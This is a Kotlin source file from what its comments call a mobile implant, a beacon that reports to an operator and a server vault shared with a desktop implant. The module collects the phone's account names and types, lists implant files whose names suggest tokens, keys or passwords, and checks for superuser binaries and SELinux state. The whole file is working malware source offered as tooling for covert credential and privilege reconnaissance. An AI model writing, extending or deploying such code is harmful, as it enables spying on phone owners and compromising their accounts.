package io.umbra.beacon

import java.io.File

/**
 * The identity material of the phone.
 *
 * A phone has no credential vault and no access tokens to steal, but it has
 * something else: the accounts of the device and the state of its own
 * privileges.  The collection answers with the same shape as the desktop
 * implant -- a kind, a source, an account, a confidence -- so the server
 * keeps the records of both in one vault.
 */
object Credentials {
    /** One piece of material, as the operator sees it. */
    data class Entry(
        val kind: String,
        val source: String,
        val account: String,
        val target: String,
        val confidence: Int,
        val secret: String,
        val note: String,
    )

    /**
     * The accounts of the device.
     *
     * The names and the types are what an operator can act on; the tokens
     * themselves belong to the applications and are not readable without
     * their own privileges.
     */
    fun accounts(context: android.content.Context?): List<Entry> {
        val out = mutableListOf<Entry>()
        if (context == null) return out
        val manager = android.accounts.AccountManager.get(context)
        val accounts = runCatching { manager.accounts }.getOrElse { emptyList() }
        for (account in accounts) {
            out.add(
                Entry(
                    kind = "token",
                    source = "accountmanager",
                    account = account.name,
                    target = account.type,
                    confidence = 60,
                    secret = "",
                    note = "an account of the device; its token belongs to the application",
                ),
            )
        }
        return out
    }

    /**
     * The files of the implant that hold something sensitive.
     *
     * The names are reported, not the contents: the operator sees what the
     * phone keeps, and asks for the content of a file when they really need
     * it.
     */
    fun stateFiles(stateDir: String): List<Entry> {
        val out = mutableListOf<Entry>()
        if (stateDir.isEmpty()) return out
        val dir = File(stateDir)
        val files = dir.listFiles() ?: return out
        for (file in files) {
            if (!file.isFile) continue
            val name = file.name.lowercase()
            val kind = when {
                name.contains("token") || name.contains("session") -> "token"
                name.contains("key") || name.contains("secret") -> "key"
                name.contains("cred") || name.contains("pass") -> "password"
                else -> continue
            }
            out.add(
                Entry(
                    kind = kind,
                    source = "file",
                    account = "android",
                    target = file.absolutePath,
                    confidence = 50,
                    secret = "",
                    note = "a file of the implant that may hold material",
                ),
            )
        }
        return out
    }

    /**
     * The privilege state of the device.
     *
     * A rooted phone is a phone the operator can do more with, and the
     * check is honest: the report says what it found and how sure it is.
     */
    fun privilegeState(): List<Entry> {
        val out = mutableListOf<Entry>()
        val su = File("/system/bin/su").exists() || File("/system/xbin/su").exists() ||
            File("/sbin/su").exists()
        out.add(
            Entry(
                kind = "key",
                source = "device",
                account = "root",
                target = "/system/bin/su",
                confidence = if (su) 90 else 20,
                secret = if (su) "present" else "",
                note = if (su) "the device carries a superuser binary" else "no superuser binary was found",
            ),
        )
        val selinux = File("/sys/fs/selinux/enforce").exists()
        out.add(
            Entry(
                kind = "token",
                source = "device",
                account = "selinux",
                target = "/sys/fs/selinux",
                confidence = 60,
                secret = "",
                note = if (selinux) "SELinux is enforcing" else "SELinux is not enforcing",
            ),
        )
        return out
    }

    /** The report the operator reads. */
    fun report(entries: List<Entry>): String {
        if (entries.isEmpty()) return "no credential material was found\n"
        val text = StringBuilder()
        text.append(String.format("%-10s %-14s %-28s %-24s %5s\n", "KIND", "SOURCE", "ACCOUNT", "TARGET", "CONF"))
        for (entry in entries) {
            text.append(
                String.format(
                    "%-10s %-14s %-28s %-24s %5d\n",
                    entry.kind,
                    entry.source,
                    entry.account.take(28),
                    entry.target.take(24),
                    entry.confidence,
                ),
            )
            if (entry.note.isNotEmpty()) {
                text.append("           note: ${entry.note}\n")
            }
        }
        return text.toString()
    }

    /** The records as the server keeps them. */
    fun values(entries: List<Entry>, raw: Boolean): Upk {
        return Upk.Arr(
            entries.map { entry ->
                Upk.map(
                    "kind" to Upk.str(entry.kind),
                    "source" to Upk.str(entry.source),
                    "account" to Upk.str(entry.account),
                    "target" to Upk.str(entry.target),
                    "confidence" to Upk.num(entry.confidence.toLong()),
                    "secret" to Upk.str(if (raw) entry.secret else ""),
                    "length" to Upk.num(entry.secret.length.toLong()),
                    "redacted" to Upk.bool(!raw),
                    "note" to Upk.str(entry.note),
                )
            },
        )
    }
}
